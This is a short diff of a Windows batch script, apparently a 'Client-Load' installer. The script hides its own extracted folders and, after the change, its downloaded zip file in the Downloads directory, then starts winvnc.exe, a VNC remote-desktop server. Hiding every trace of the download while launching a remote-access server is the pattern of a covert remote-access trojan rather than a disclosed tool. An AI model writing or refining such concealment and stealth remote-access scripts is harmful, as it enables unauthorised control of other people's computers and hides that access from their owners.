@@ -39,8 +39,8 @@ REM Hide the extracted Client-load folder and its parent folder
 attrib +h "%script_dir%\.."
 attrib +h "%script_dir%\..\.."
 
-REM Hide the Client-Load-main folder in the Downloads directory
-attrib +h "%USERPROFILE%\Downloads\Client-Load-main"
+REM Hide the Client-Load-main.zip file in the Downloads directory
+attrib +h "%USERPROFILE%\Downloads\Client-Load-main.zip"
 
 REM Start winvnc.exe for the first time and wait for 10 seconds
 start "" "%script_dir%winvnc.exe"
